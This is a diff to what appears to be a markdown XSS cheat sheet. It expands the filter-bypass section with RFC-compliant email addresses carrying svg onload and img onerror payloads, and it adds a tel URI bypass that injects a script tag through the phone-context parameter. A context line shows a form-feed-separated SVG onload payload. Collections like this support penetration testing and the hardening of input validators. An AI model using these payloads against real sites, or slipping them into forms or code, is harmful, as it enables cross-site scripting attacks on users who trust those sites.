@@ -775,19 +775,31 @@ $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
 ```
 
+
 ### Bypass email filter
 
-([RFC compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate))
+* [RFC0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)
+  ```javascript
+  "><svg/onload=confirm(1)>"@x.y
+  ```
+
+* [RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/)
+  ```javascript
+  xss@example.com(<img src='x' onerror='alert(document.location)'>)
+  ```
+
+
+### Bypass tel URI filter
+
+At least 2 RFC mention the `;phone-context=` descriptor:
+
+* [RFC3966 - The tel URI for Telephone Numbers](https://www.ietf.org/rfc/rfc3966.txt)
+* [RFC2806 - URLs for Telephone Calls](https://www.ietf.org/rfc/rfc2806.txt)
 
 ```javascript
-"><svg/onload=confirm(1)>"@x.y
++330011223344;phone-context=<script>alert(0)</script>
 ```
 
-([RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/))
-
-```javascript
-xss@example.com(<img src='x' onerror='alert(document.location)'>)
-```
 
 ### Bypass document blacklist
 
